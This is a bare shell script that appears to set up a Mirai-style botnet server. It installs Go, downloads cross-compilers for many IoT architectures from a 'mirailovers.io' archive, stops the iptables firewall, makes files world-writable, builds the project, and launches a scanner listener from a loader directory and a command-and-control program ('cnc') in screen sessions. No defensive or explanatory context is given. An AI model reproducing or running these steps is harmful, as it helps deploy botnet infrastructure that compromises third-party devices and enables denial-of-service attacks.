cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
sha256sum go1.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz

export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH


mkdir -p "$GOPATH/src/your_project"
cd "$GOPATH/src/your_project"
go mod init your_project


export GO111MODULE=on
go get filippo.io/edwards25519@v1.0.0
go get github.com/go-sql-driver/mysql@v1.4.1
go get github.com/mattn/go-shellwords

echo 'export GOROOT=/usr/local/go' >> ~/.bash_profile
echo 'export GOPATH=$HOME/Projects/Proj1' >> ~/.bash_profile
echo 'export PATH=$GOPATH/bin:$GOROOT/bin:$PATH' >> ~/.bash_profile

source ~/.bash_profile
go version
go env
cd ~/

mkdir /etc/xcompile
cd /etc/xcompile
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sparc.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv6l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc-440fp.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i486.tar.gz

tar -xf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -xf cross-compiler-i486.tar.gz
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
rm -rf *.tar.bz2*
rm -rf *.tar.gz*
mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
mv cross-compiler-i486 i486
mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-x86_64 x86_64

service mariadb restart

service iptables stop 
service httpd restart  
service mariadb restart

cd ~/
chmod 777 *
sh build.sh

ulimit -n999999; ulimit -u999999; ulimit -e999999

cd loader
screen ./scanListen

cd ~/
screen ./cnc

